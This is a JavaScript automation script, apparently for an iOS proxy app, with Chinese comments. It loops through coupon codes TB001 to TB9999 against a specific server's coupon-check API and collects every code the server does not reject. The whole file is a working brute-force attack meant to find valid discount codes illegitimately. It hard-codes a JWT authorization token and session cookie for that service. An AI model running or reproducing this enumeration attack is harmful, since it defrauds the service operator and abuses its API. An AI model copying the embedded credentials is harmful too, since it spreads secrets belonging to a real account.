// ====== 配置 ======
const START = 1;
const END = 9999;
const DELAY = 100; // 每条间隔 100ms

// 固定信息
const url = `http://154.17.5.149:12325/api/v1/user/coupon/check`;
const headers = {
    'Connection': 'keep-alive',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Language': 'zh-CN',
    'Content-Type': 'application/json;charset=utf-8',
    'Origin': 'http://154.17.5.149:12325',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NTEwODAxLCJzZXNzaW9uIjoiNDhhZTZhMmQ1MzhjYjNkOWMyNTc5MzVlYjA1ODEyNGIifQ.caRj4SNBr2KQgkXyUXPe4tc-us3siMtFIX8aa_pZ-NA',
    'Cookie': '_ss_s_uid=96baefca1fccfc5413b0024f678d37fb; authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NTEwODAxLCJzZXNzaW9uIjoiNDhhZTZhMmQ1MzhjYjNkOWMyNTc5MzVlYjA1ODEyNGIifQ.caRj4SNBr2KQgkXyUXPe4tc-us3siMtFIX8aa_pZ-NA',
    'Host': `154.17.5.149:12325`,
    'Referer': `http://154.17.5.149:12325/`,
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
    'Accept': 'application/json, text/plain, */*'
};


// ====== 工具函数 ======
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// 不足 3 位补 3 位，不足 4 位不补
function generateCode(i) {
    const num = i.toString();
    if (num.length === 1) return "TB00" + num;
    if (num.length === 2) return "TB0" + num;
    if (num.length === 3) return "TB" + num;
    return "TB" + num; // 4 位不补
}


// ====== 主逻辑 ======
(async () => {
    let validCodes = [];  // 存放找到的有效券码

    console.log("==== 优惠码暴力检测脚本启动 ====");
    console.log(`范围：TB001 至 TB9999`);
    console.log("================================");

    for (let i = START; i <= END; i++) {

        let code = generateCode(i);
        console.log(`\n  正在尝试优惠码：${code}`);

        let body = JSON.stringify({
            code: code,
            plan_id: 6
        });

        try {
            let response = await $task.fetch({
                url: url,
                method: "POST",
                headers: headers,
                body: body
            });

            let text = response.body || "";
            console.log(` 返回：${text}`);

            // 尝试解析 JSON
            let obj = {};
            try { obj = JSON.parse(text); } catch (e) {}

            // 判断是否无效
            if (obj.message && obj.message.includes("无效")) {
                // 无效，不记录
            } else {
                // 视为有效
                validCodes.push({
                    code: code,
                    response: text
                });

                console.log("\n====== 找到有效优惠码 ======");
                console.log(` 优惠码：${code}`);
                console.log(` 返回信息：${text}`);
                console.log("===========================\n");
            }

        } catch (e) {
            console.log(` 请求失败：${e}`);
        }

        await sleep(DELAY);
    }

    console.log("\n==== 检测结束 ====");

    // 最终汇报
    if (validCodes.length === 0) {
        $notify("优惠码扫描完成", "未找到有效优惠码", "");
    } else {
        let summary = validCodes.map(v => `${v.code}`).join(", ");
        $notify(
            "优惠码扫描完成",
            `共找到 ${validCodes.length} 个有效优惠码`,
            summary
        );
    }

    $done();
})();
